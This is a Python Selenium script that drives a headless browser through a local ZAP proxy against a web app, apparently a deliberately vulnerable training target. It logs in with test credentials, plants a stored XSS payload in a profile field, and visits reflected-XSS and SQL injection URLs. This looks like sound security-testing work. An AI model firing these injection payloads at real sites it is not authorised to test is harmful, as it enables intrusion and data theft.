from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time


def run_browser_through_zap(target_url):
    print("🧠 Launching browser via Selenium through ZAP proxy...")

    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--proxy-server=http://127.0.0.1:8080")

    driver = webdriver.Chrome(options=chrome_options)

    try:
        # Step 1: Login
        login_url = f"{target_url}/login"
        print(f"🔐 Navigating to: {login_url}")
        driver.get(login_url)
        time.sleep(2)

        driver.find_element(By.ID, "userName").send_keys("user1")
        driver.find_element(By.ID, "password").send_keys("User1_123")
        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
        time.sleep(3)

        if "Logout" not in driver.page_source:
            print("❌ Login failed or not redirected correctly.")
            driver.save_screenshot("login_fail_debug.png")
            return
        print("✅ Logged in.")

        # Step 2: Inject stored XSS into /profile
        print("💉 Injecting stored XSS into /profile...")
        driver.get(f"{target_url}/profile")
        driver.save_screenshot("profile_xss_debug_before.png")
        time.sleep(2)

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "firstName"))
        )
        first_name = driver.find_element(By.ID, "firstName")
        first_name.clear()
        first_name.send_keys("<script>alert('stored-xss')</script>")

        submit_button = driver.find_element(By.CSS_SELECTOR, "button[name='submit']")
        driver.execute_script("arguments[0].click();", submit_button)
        time.sleep(2)

        # Step 3: Revisit /profile to expose stored XSS
        print("🔁 Revisiting /profile to reflect stored XSS...")
        driver.get(f"{target_url}/profile")
        driver.save_screenshot("profile_xss_debug_after.png")
        time.sleep(3)

        # Step 4: Visit page with reflected XSS in query param
        reflected_url = f"{target_url}/profile?xss=<script>alert('reflected')</script>"
        print(f"🌐 Visiting reflected XSS test: {reflected_url}")
        driver.get(reflected_url)
        driver.save_screenshot("reflected_xss_debug.png")
        time.sleep(2)

        # Step 5: Visit SQLi paths
        sqli_urls = [
            f"{target_url}/contributions?userId=1' OR '1'='1",
            f"{target_url}/allocations/2?userId=2' UNION SELECT NULL--",
        ]
        for url in sqli_urls:
            print(f"🧨 Visiting SQLi test: {url}")
            driver.get(url)
            time.sleep(2)

        # Step 6: Visit additional internal pages
        print("📂 Visiting /memos")
        driver.get(f"{target_url}/memos")
        time.sleep(2)

    except Exception as e:
        print(f"❌ Selenium error: {e}")
        driver.save_screenshot("selenium_error_debug.png")
    finally:
        print("🧹 Closing browser.")
        driver.quit()
